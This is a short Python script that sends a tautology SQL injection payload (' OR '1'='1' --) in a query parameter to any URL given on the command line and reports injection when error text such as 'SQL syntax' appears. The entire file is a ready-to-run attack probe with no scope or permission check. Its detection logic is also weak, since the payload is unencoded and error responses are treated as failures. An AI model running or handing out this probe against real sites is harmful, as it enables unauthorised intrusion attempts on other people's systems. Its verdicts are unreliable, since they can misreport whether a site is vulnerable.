import requests

def sql_injection(url):
   
    payload = "' OR '1'='1' -- "
    target_url = f"{url}?input={payload}"

    try:
        
        response = requests.get(target_url, timeout=10)
        response.raise_for_status()  

        
        if "SQL syntax" in response.text or "mysql" in response.text.lower():
            return f"SQL Injection detected on {url} with payload {payload}"
        else:
            return f"No SQL Injection vulnerability detected on {url}"
    except requests.exceptions.RequestException as e:
        return f"Failed to test {url}. Error: {e}"

if __name__ == "__main__":
    import sys
    if len(sys.argv) != 2:
        print("Usage: python sql_injection_script.py <url>")
        sys.exit(1)

    target_url = sys.argv[1]
    print(sql_injection(target_url))
